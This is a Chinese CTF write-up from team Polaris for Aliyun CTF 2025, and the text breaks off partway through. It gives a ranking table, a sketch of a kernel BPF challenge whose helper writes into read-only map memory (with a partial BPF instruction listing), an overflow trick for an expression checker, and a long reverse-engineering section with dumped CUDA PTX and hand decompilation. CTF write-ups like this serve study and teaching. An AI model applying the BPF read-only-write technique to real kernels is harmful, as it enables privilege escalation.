# 阿里云CTF2025 Writeup

> 原文: https://www.ctfiot.com/229002.html
> ID: 229002

本次 阿里云CTF2025，我们Polaris战队排名第12。

排名

队伍

总分

11

NulL

3108

12

Polaris

2572

13

Ta

2227

14

V&N

1751

15

TeamGipsy

1751

16

Nepnep

1560

17

从容应

1430

18

小酒馆

1403

19

DJB

1251

20

A1natas

1251

乍一看，逻辑十分严谨，也使用了锁操作，不存在漏洞。

alimem_mmap函数则是会对pages[idx]对应的物理内存进行用户空间的映射，使内核和用户共享一块物理内存，实现高效的数据传输。

可以注意到往内核bpf框架中添加了一个bpf函数。

该函数接收三个参数，参数1和参数3都是一个指向只读内存的指针，参数二是size，这里固定为sizeof(s64)=8.

而该函数的作用则是从指针1指向的内存读取s64类型的数据并异或2025放到指针2指向的内存。

很显然，指针二是只读内存，这样会导致只读内存的修改。

这里需要了解到一点，bpf验证程序verifier在ld只读map时，会进行提前数据载入。

比如，如下bpf指令，此时array_fd对应得map是只读的。

//其中map->value[0] = 0;

struct bpf_insn insns[] = {
        /* save skb_buff. */
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1, 0),
        
        /* map_lookup_elem, 获取只读数据 */
        BPF_LD_MAP_FD(BPF_REG_1, array_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10, 0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, -1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0, 0),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
        
        BPF_EXIT_INSN()
};

执行结果如下：

数字不超过8位

表达式长度不超过200个字符

表达式项数不超过15

这个表达式不能等于自己

因此我们构造一个足够大且满足条件的mba表达式使其溢出，即可导致expr!=expr：

99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)+99999999*(x^y)

RE

easy-cuda-rev

载入ida之后对主程序进行分析，主逻辑还是比较清晰明了的

该程序实现的就是对flag文件进行的加密操作，追踪cuda_encrypto函数即可，由于是cuda编写的，我们追踪一下注册函数的api

即会发现加密的主要逻辑应该是存储在下图位置，参考文章https://bbs.kanxue.com/thread-275989.htm

然后使用工具将ptx汇编dump下来

Fatbin elf code:
================
arch = sm_52
code version = [1,7]
host = linux
compile_size = 64bit

Fatbin elf code:
================
arch = sm_52
code version = [1,7]
host = linux
compile_size = 64bit

Fatbin ptx code:
================
arch = sm_52
code version = [8,0]
host = linux
compile_size = 64bit
compressed

.version 8.0
.target sm_52
.address_size 64

.extern .func (.param .b32 func_retval0) vprintf
(
.param .b64 vprintf_param_0,
.param .b64 vprintf_param_1
)
;
.const .align 1 .b8 T[256] = {99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22};
.const .align 1 .b8 RT[256] = {82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, 250, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, 200, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125};
.global .align 1 .b8 $str[8] = {103, 105, 102, 116, 49, 58, 10, 0};
.global .align 1 .b8 $str$1[6] = {37, 48, 50, 120, 32, 0};
.global .align 1 .b8 $str$2[2] = {10, 0};
.global .align 1 .b8 $str$3[8] = {103, 105, 102, 116, 50, 58, 10, 0};
.global .align 1 .b8 $str$4[8] = {103, 105, 102, 116, 51, 58, 10, 0};
.global .align 1 .b8 $str$5[8] = {103, 105, 102, 116, 52, 58, 10, 0};
.global .align 1 .b8 $str$6[8] = {103, 105, 102, 116, 53, 58, 10, 0};

.visible .entry _Z14encrypt_kernelPhh(
.param .u64 _Z14encrypt_kernelPhh_param_0,
.param .u8 _Z14encrypt_kernelPhh_param_1
)
{
.local .align 8 .b8 __local_depot0[8];
.reg .b64 %SP;
.reg .b64 %SPL;
.reg .pred %p<41>;
.reg .b16 %rs<62>;
.reg .b32 %r<265>;
.reg .b64 %rd<103>;

mov.u64 %SPL, __local_depot0;
cvta.local.u64 %SP, %SPL;
ld.param.u8 %rs12, [_Z14encrypt_kernelPhh_param_1];
ld.param.u64 %rd19, [_Z14encrypt_kernelPhh_param_0];
cvta.to.global.u64 %rd1, %rd19;
add.u64 %rd20, %SP, 0;
add.u64 %rd2, %SPL, 0;
mov.u32 %r1, %ntid.x;
mov.u32 %r54, %ctaid.x;
mul.lo.s32 %r2, %r54, %r1;
mov.u32 %r3, %tid.x;
add.s32 %r4, %r2, %r3;
setp.ge.u32 %p1, %r3, %r1;
cvt.s64.s32 %rd21, %r4;
add.s64 %rd3, %rd1, %rd21;
@%p1 bra $L__BB0_12;

ld.global.u8 %rs13, [%rd3];
cvt.u16.u32 %rs14, %r4;
mul.lo.s16 %rs15, %rs14, 73;
add.s16 %rs16, %rs15, %rs12;
xor.b16 %rs17, %rs13, %rs16;
and.b16 %rs18, %rs17, 240;
shr.u16 %rs19, %rs18, 4;
shl.b16 %rs20, %rs17, 4;
or.b16 %rs58, %rs19, %rs20;
mov.u32 %r242, 0;
mov.u64 %rd24, T;

$L__BB0_2:
cvt.u64.u16 %rd22, %rs58;
and.b64 %rd23, %rd22, 255;
add.s64 %rd25, %rd24, %rd23;
ld.const.u8 %rs21, [%rd25];
shr.u16 %rs22, %rs21, 4;
shl.b16 %rs23, %rs21, 4;
or.b16 %rs24, %rs22, %rs23;
cvt.u16.u32 %rs25, %r242;
xor.b16 %rs58, %rs24, %rs25;
add.s32 %r242, %r242, 1;
setp.lt.u32 %p2, %r242, 10485760;
@%p2 bra $L__BB0_2;

mov.u32 %r243, 0;

$L__BB0_4:
cvt.u64.u16 %rd26, %rs58;
and.b64 %rd27, %rd26, 255;
add.s64 %rd29, %rd24, %rd27;
ld.const.u8 %rs26, [%rd29];
shr.u16 %rs27, %rs26, 4;
shl.b16 %rs28, %rs26, 4;
or.b16 %rs29, %rs27, %rs28;
cvt.u16.u32 %rs30, %r243;
xor.b16 %rs58, %rs29, %rs30;
add.s32 %r243, %r243, 1;
setp.lt.u32 %p3, %r243, 10485760;
@%p3 bra $L__BB0_4;

mov.u32 %r244, 0;

$L__BB0_6:
cvt.u64.u16 %rd30, %rs58;
and.b64 %rd31, %rd30, 255;
add.s64 %rd33, %rd24, %rd31;
ld.const.u8 %rs31, [%rd33];
shr.u16 %rs32, %rs31, 4;
shl.b16 %rs33, %rs31, 4;
or.b16 %rs34, %rs32, %rs33;
cvt.u16.u32 %rs35, %r244;
xor.b16 %rs58, %rs34, %rs35;
add.s32 %r244, %r244, 1;
setp.lt.u32 %p4, %r244, 10485760;
@%p4 bra $L__BB0_6;

mov.u32 %r245, 0;

$L__BB0_8:
cvt.u64.u16 %rd34, %rs58;
and.b64 %rd35, %rd34, 255;
add.s64 %rd37, %rd24, %rd35;
ld.const.u8 %rs36, [%rd37];
shr.u16 %rs37, %rs36, 4;
shl.b16 %rs38, %rs36, 4;
or.b16 %rs39, %rs37, %rs38;
cvt.u16.u32 %rs40, %r245;
xor.b16 %rs58, %rs39, %rs40;
add.s32 %r245, %r245, 1;
setp.lt.u32 %p5, %r245, 10485760;
@%p5 bra $L__BB0_8;

mov.u32 %r246, 0;

$L__BB0_10:
cvt.u64.u16 %rd38, %rs58;
and.b64 %rd39, %rd38, 255;
add.s64 %rd41, %rd24, %rd39;
ld.const.u8 %rs41, [%rd41];
shr.u16 %rs42, %rs41, 4;
shl.b16 %rs43, %rs41, 4;
or.b16 %rs44, %rs42, %rs43;
cvt.u16.u32 %rs45, %r246;
xor.b16 %rs58, %rs44, %rs45;
add.s32 %r246, %r246, 1;
setp.lt.u32 %p6, %r246, 10485760;
@%p6 bra $L__BB0_10;

st.global.u8 [%rd3], %rs58;

$L__BB0_12:
bar.sync 0;
setp.ne.s32 %p7, %r4, 0;
@%p7 bra $L__BB0_17;

mov.u64 %rd42, $str;
cvta.global.u64 %rd43, %rd42;
mov.u64 %rd44, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd43;
.param .b64 param1;
st.param.b64 [param1+0], %rd44;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r60, [retval0+0];
}
        setp.eq.s32 %p8, %r1, 0;
@%p8 bra $L__BB0_16;

mov.u32 %r247, 0;
mov.u64 %rd45, $str$1;
cvta.global.u64 %rd46, %rd45;
mov.u64 %rd97, %rd1;

$L__BB0_15:
ld.global.u8 %r62, [%rd97];
st.local.u32 [%rd2], %r62;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd46;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r63, [retval0+0];
}
        add.s64 %rd97, %rd97, 1;
add.s32 %r247, %r247, 1;
setp.lt.u32 %p9, %r247, %r1;
@%p9 bra $L__BB0_15;

$L__BB0_16:
mov.u64 %rd48, $str$2;
cvta.global.u64 %rd49, %rd48;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd49;
.param .b64 param1;
st.param.b64 [param1+0], %rd44;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r64, [retval0+0];
}

$L__BB0_17:
bar.sync 0;
setp.eq.s32 %p10, %r1, 0;
setp.ne.s32 %p11, %r3, 0;
or.pred %p12, %p11, %p10;
@%p12 bra $L__BB0_20;

cvt.s64.s32 %rd51, %r2;
add.s64 %rd98, %rd1, %rd51;
mov.u32 %r248, 0;

$L__BB0_19:
add.s32 %r248, %r248, 1;
rem.u32 %r66, %r248, %r1;
add.s32 %r67, %r66, %r2;
cvt.s64.s32 %rd52, %r67;
add.s64 %rd53, %rd1, %rd52;
ld.global.u8 %rs46, [%rd98];
xor.b16 %rs47, %rs46, %rs12;
ld.global.u8 %rs48, [%rd53];
xor.b16 %rs49, %rs47, %rs48;
st.global.u8 [%rd98], %rs49;
add.s64 %rd98, %rd98, 1;
setp.lt.u32 %p13, %r248, %r1;
@%p13 bra $L__BB0_19;

$L__BB0_20:
bar.sync 0;
@%p7 bra $L__BB0_25;

mov.u64 %rd54, $str$3;
cvta.global.u64 %rd55, %rd54;
mov.u64 %rd56, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd55;
.param .b64 param1;
st.param.b64 [param1+0], %rd56;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r68, [retval0+0];
}
        @%p10 bra $L__BB0_24;

mov.u32 %r249, 0;
mov.u64 %rd57, $str$1;
cvta.global.u64 %rd58, %rd57;
mov.u64 %rd99, %rd1;

$L__BB0_23:
ld.global.u8 %r70, [%rd99];
st.local.u32 [%rd2], %r70;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd58;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r71, [retval0+0];
}
        add.s64 %rd99, %rd99, 1;
add.s32 %r249, %r249, 1;
setp.lt.u32 %p16, %r249, %r1;
@%p16 bra $L__BB0_23;

$L__BB0_24:
mov.u64 %rd60, $str$2;
cvta.global.u64 %rd61, %rd60;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd61;
.param .b64 param1;
st.param.b64 [param1+0], %rd56;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r72, [retval0+0];
}

$L__BB0_25:
bar.sync 0;
and.b32 %r73, %r3, 1;
setp.eq.b32 %p18, %r73, 1;
add.s32 %r74, %r3, 1;
rem.u32 %r75, %r74, %r1;
add.s32 %r76, %r75, %r2;
cvt.s64.s32 %rd63, %r76;
add.s64 %rd11, %rd1, %rd63;
or.pred %p19, %p1, %p18;
@%p19 bra $L__BB0_27;

ld.global.u8 %rs50, [%rd3];
ld.global.u8 %rs51, [%rd11];
st.global.u8 [%rd3], %rs51;
st.global.u8 [%rd11], %rs50;

$L__BB0_27:
bar.sync 0;
@%p7 bra $L__BB0_32;

mov.u64 %rd64, $str$4;
cvta.global.u64 %rd65, %rd64;
mov.u64 %rd66, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd65;
.param .b64 param1;
st.param.b64 [param1+0], %rd66;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r77, [retval0+0];
}
        @%p10 bra $L__BB0_31;

mov.u32 %r250, 0;
mov.u64 %rd67, $str$1;
cvta.global.u64 %rd68, %rd67;
mov.u64 %rd100, %rd1;

$L__BB0_30:
ld.global.u8 %r79, [%rd100];
st.local.u32 [%rd2], %r79;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd68;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r80, [retval0+0];
}
        add.s64 %rd100, %rd100, 1;
add.s32 %r250, %r250, 1;
setp.lt.u32 %p22, %r250, %r1;
@%p22 bra $L__BB0_30;

$L__BB0_31:
mov.u64 %rd70, $str$2;
cvta.global.u64 %rd71, %rd70;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd71;
.param .b64 param1;
st.param.b64 [param1+0], %rd66;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r81, [retval0+0];
}

$L__BB0_32:
bar.sync 0;
setp.lt.s32 %p24, %r3, 1;
or.pred %p25, %p24, %p1;
shr.u32 %r82, %r3, 31;
add.s32 %r83, %r3, %r82;
and.b32 %r84, %r83, -2;
sub.s32 %r85, %r3, %r84;
setp.ne.s32 %p26, %r85, 1;
or.pred %p27, %p25, %p26;
@%p27 bra $L__BB0_34;

ld.global.u8 %rs52, [%rd3];
ld.global.u8 %rs53, [%rd11];
st.global.u8 [%rd3], %rs53;
st.global.u8 [%rd11], %rs52;

$L__BB0_34:
bar.sync 0;
@%p7 bra $L__BB0_39;

mov.u64 %rd73, $str$5;
cvta.global.u64 %rd74, %rd73;
mov.u64 %rd75, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd74;
.param .b64 param1;
st.param.b64 [param1+0], %rd75;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r86, [retval0+0];
}
        @%p10 bra $L__BB0_38;

mov.u32 %r251, 0;
mov.u64 %rd76, $str$1;
cvta.global.u64 %rd77, %rd76;
mov.u64 %rd101, %rd1;

$L__BB0_37:
ld.global.u8 %r88, [%rd101];
st.local.u32 [%rd2], %r88;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd77;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r89, [retval0+0];
}
        add.s64 %rd101, %rd101, 1;
add.s32 %r251, %r251, 1;
setp.lt.u32 %p30, %r251, %r1;
@%p30 bra $L__BB0_37;

$L__BB0_38:
mov.u64 %rd79, $str$2;
cvta.global.u64 %rd80, %rd79;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd80;
.param .b64 param1;
st.param.b64 [param1+0], %rd75;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r90, [retval0+0];
}

$L__BB0_39:
bar.sync 0;
and.b32 %r91, %r3, 7;
setp.ne.s32 %p32, %r91, 0;
or.pred %p33, %p1, %p32;
@%p33 bra $L__BB0_43;

ld.global.u32 %r259, [%rd3+4];
ld.global.u32 %r260, [%rd3];
mov.u32 %r258, 0;
mov.u32 %r257, -239350328;
mov.u32 %r256, 387276957;
mov.u32 %r255, 2027808484;
mov.u32 %r254, -626627285;
mov.u32 %r253, 1013904242;
mov.u32 %r252, -1640531527;

$L__BB0_41:
shl.b32 %r99, %r259, 4;
add.s32 %r100, %r99, -1556008596;
shr.u32 %r101, %r259, 5;
add.s32 %r102, %r101, -939442524;
xor.b32 %r103, %r102, %r100;
add.s32 %r104, %r252, %r259;
xor.b32 %r105, %r103, %r104;
add.s32 %r106, %r105, %r260;
shl.b32 %r107, %r106, 4;
add.s32 %r108, %r107, 1013904242;
add.s32 %r109, %r106, %r252;
xor.b32 %r110, %r108, %r109;
shr.u32 %r111, %r106, 5;
add.s32 %r112, %r111, 338241895;
xor.b32 %r113, %r110, %r112;
add.s32 %r114, %r113, %r259;
shl.b32 %r115, %r114, 4;
add.s32 %r116, %r115, -1556008596;
add.s32 %r117, %r253, %r114;
shr.u32 %r118, %r114, 5;
add.s32 %r119, %r118, -939442524;
xor.b32 %r120, %r119, %r116;
xor.b32 %r121, %r120, %r117;
add.s32 %r122, %r121, %r106;
shl.b32 %r123, %r122, 4;
add.s32 %r124, %r123, 1013904242;
add.s32 %r125, %r122, %r253;
xor.b32 %r126, %r124, %r125;
shr.u32 %r127, %r122, 5;
add.s32 %r128, %r127, 338241895;
xor.b32 %r129, %r126, %r128;
add.s32 %r130, %r129, %r114;
shl.b32 %r131, %r130, 4;
add.s32 %r132, %r131, -1556008596;
add.s32 %r133, %r254, %r130;
shr.u32 %r134, %r130, 5;
add.s32 %r135, %r134, -939442524;
xor.b32 %r136, %r135, %r132;
xor.b32 %r137, %r136, %r133;
add.s32 %r138, %r137, %r122;
shl.b32 %r139, %r138, 4;
add.s32 %r140, %r139, 1013904242;
add.s32 %r141, %r138, %r254;
xor.b32 %r142, %r140, %r141;
shr.u32 %r143, %r138, 5;
add.s32 %r144, %r143, 338241895;
xor.b32 %r145, %r142, %r144;
add.s32 %r146, %r145, %r130;
shl.b32 %r147, %r146, 4;
add.s32 %r148, %r147, -1556008596;
add.s32 %r149, %r255, %r146;
shr.u32 %r150, %r146, 5;
add.s32 %r151, %r150, -939442524;
xor.b32 %r152, %r151, %r148;
xor.b32 %r153, %r152, %r149;
add.s32 %r154, %r153, %r138;
shl.b32 %r155, %r154, 4;
add.s32 %r156, %r155, 1013904242;
add.s32 %r157, %r154, %r255;
xor.b32 %r158, %r156, %r157;
shr.u32 %r159, %r154, 5;
add.s32 %r160, %r159, 338241895;
xor.b32 %r161, %r158, %r160;
add.s32 %r162, %r161, %r146;
shl.b32 %r163, %r162, 4;
add.s32 %r164, %r163, -1556008596;
add.s32 %r165, %r256, %r162;
shr.u32 %r166, %r162, 5;
add.s32 %r167, %r166, -939442524;
xor.b32 %r168, %r167, %r164;
xor.b32 %r169, %r168, %r165;
add.s32 %r170, %r169, %r154;
shl.b32 %r171, %r170, 4;
add.s32 %r172, %r171, 1013904242;
add.s32 %r173, %r170, %r256;
xor.b32 %r174, %r172, %r173;
shr.u32 %r175, %r170, 5;
add.s32 %r176, %r175, 338241895;
xor.b32 %r177, %r174, %r176;
add.s32 %r178, %r177, %r162;
shl.b32 %r179, %r178, 4;
add.s32 %r180, %r179, -1556008596;
add.s32 %r181, %r257, -1013904242;
add.s32 %r182, %r181, %r178;
shr.u32 %r183, %r178, 5;
add.s32 %r184, %r183, -939442524;
xor.b32 %r185, %r184, %r180;
xor.b32 %r186, %r185, %r182;
add.s32 %r187, %r186, %r170;
shl.b32 %r188, %r187, 4;
add.s32 %r189, %r188, 1013904242;
add.s32 %r190, %r187, %r181;
xor.b32 %r191, %r189, %r190;
shr.u32 %r192, %r187, 5;
add.s32 %r193, %r192, 338241895;
xor.b32 %r194, %r191, %r193;
add.s32 %r195, %r194, %r178;
shl.b32 %r196, %r195, 4;
add.s32 %r197, %r196, -1556008596;
add.s32 %r198, %r257, 1640531527;
add.s32 %r199, %r198, %r195;
shr.u32 %r200, %r195, 5;
add.s32 %r201, %r200, -939442524;
xor.b32 %r202, %r201, %r197;
xor.b32 %r203, %r202, %r199;
add.s32 %r204, %r203, %r187;
shl.b32 %r205, %r204, 4;
add.s32 %r206, %r205, 1013904242;
add.s32 %r207, %r204, %r198;
xor.b32 %r208, %r206, %r207;
shr.u32 %r209, %r204, 5;
add.s32 %r210, %r209, 338241895;
xor.b32 %r211, %r208, %r210;
add.s32 %r212, %r211, %r195;
shl.b32 %r213, %r212, 4;
add.s32 %r214, %r213, -1556008596;
add.s32 %r215, %r257, %r212;
shr.u32 %r216, %r212, 5;
add.s32 %r217, %r216, -939442524;
xor.b32 %r218, %r217, %r214;
xor.b32 %r219, %r218, %r215;
add.s32 %r260, %r219, %r204;
shl.b32 %r220, %r260, 4;
add.s32 %r221, %r220, 1013904242;
add.s32 %r222, %r260, %r257;
xor.b32 %r223, %r221, %r222;
shr.u32 %r224, %r260, 5;
add.s32 %r225, %r224, 338241895;
xor.b32 %r226, %r223, %r225;
add.s32 %r259, %r226, %r212;
add.s32 %r257, %r257, -239350328;
add.s32 %r256, %r256, -239350328;
add.s32 %r255, %r255, -239350328;
add.s32 %r254, %r254, -239350328;
add.s32 %r253, %r253, -239350328;
add.s32 %r252, %r252, -239350328;
add.s32 %r258, %r258, 8;
setp.ne.s32 %p34, %r258, 10485760;
@%p34 bra $L__BB0_41;

st.global.u32 [%rd3], %r260;
st.global.u32 [%rd3+4], %r259;

$L__BB0_43:
bar.sync 0;
@%p7 bra $L__BB0_52;

mov.u64 %rd82, $str$6;
cvta.global.u64 %rd83, %rd82;
mov.u64 %rd84, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd83;
.param .b64 param1;
st.param.b64 [param1+0], %rd84;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r227, [retval0+0];
}
        @%p10 bra $L__BB0_51;

add.s32 %r229, %r1, -1;
and.b32 %r264, %r1, 3;
setp.lt.u32 %p37, %r229, 3;
mov.u32 %r263, 0;
@%p37 bra $L__BB0_48;

sub.s32 %r262, %r1, %r264;
mov.u64 %rd87, $str$1;
cvta.global.u64 %rd88, %rd87;

$L__BB0_47:
cvt.s64.s32 %rd85, %r263;
add.s64 %rd86, %rd1, %rd85;
ld.global.u8 %r231, [%rd86];
st.local.u32 [%rd2], %r231;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd88;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r232, [retval0+0];
}
        ld.global.u8 %r233, [%rd86+1];
st.local.u32 [%rd2], %r233;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd88;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r234, [retval0+0];
}
        ld.global.u8 %r235, [%rd86+2];
st.local.u32 [%rd2], %r235;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd88;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r236, [retval0+0];
}
        ld.global.u8 %r237, [%rd86+3];
st.local.u32 [%rd2], %r237;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd88;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r238, [retval0+0];
}
        add.s32 %r263, %r263, 4;
add.s32 %r262, %r262, -4;
setp.ne.s32 %p38, %r262, 0;
@%p38 bra $L__BB0_47;

$L__BB0_48:
setp.eq.s32 %p39, %r264, 0;
@%p39 bra $L__BB0_51;

cvt.s64.s32 %rd90, %r263;
add.s64 %rd102, %rd1, %rd90;
mov.u64 %rd91, $str$1;
cvta.global.u64 %rd92, %rd91;

$L__BB0_50:
.pragma "nounroll";
ld.global.u8 %r239, [%rd102];
st.local.u32 [%rd2], %r239;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd92;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r240, [retval0+0];
}
        add.s64 %rd102, %rd102, 1;
add.s32 %r264, %r264, -1;
setp.ne.s32 %p40, %r264, 0;
@%p40 bra $L__BB0_50;

$L__BB0_51:
mov.u64 %rd94, $str$2;
cvta.global.u64 %rd95, %rd94;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd95;
.param .b64 param1;
st.param.b64 [param1+0], %rd84;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r241, [retval0+0];
}

$L__BB0_52:
bar.sync 0;
cvt.u16.u32 %rs54, %r4;
ld.global.u8 %rs55, [%rd3];
xor.b16 %rs56, %rs55, %rs54;
st.global.u8 [%rd3], %rs56;
ret;

然后就开始痛苦的人肉反编译，一开始用gpt试了一下，效果太差了，不是给人看的，初始化了T盒和RT盒，一开始还以为是AES，但是读到L__BB0_41部分之后发现有类似tea的特征，T盒的内容有5个大循环中使用进行混淆

uint8_t* rd3 = (uint8_t*)(rd1 + r4);
uint8_t rs13 = *rd3;
uint16_t rs14 = (uint16_t)r4;
uint16_t rs15 = rs14*73;
uint16_t rs16 = rs15+temp;
uint16_t rs17 = rs13 ^ rs16;
uint16_t rs18 = rs17 & 0xF0;
uint16_t rs19 = rs18 >> 4;
uint16_t rs20 = rs17 << 4;
uint16_t rs58 = rs19 | rs20;

for(int i=0;i<10485760;i++)
{
    uint8_t rs21 = T[rs58 & 0xFF]
    uint16_t rs22 = rs21 >> 4;
    uint16_t rs23 = rs21 << 4;
    uint16_t rs24 = rs22 | rs23;
    rs58 = rs24 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
    uint8_t rs26 = T[rs58 & 0xFF]
    uint16_t rs27 = rs26 >> 4;
    uint16_t rs28 = rs26 << 4;
    uint16_t rs29 = rs27 | rs28;
    rs58 = rs29 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
    uint8_t rs31 = T[rs58 & 0xFF]
    uint16_t rs32 = rs31 >> 4;
    uint16_t rs33 = rs31 << 4;
    uint16_t rs34 = rs32 | rs33;
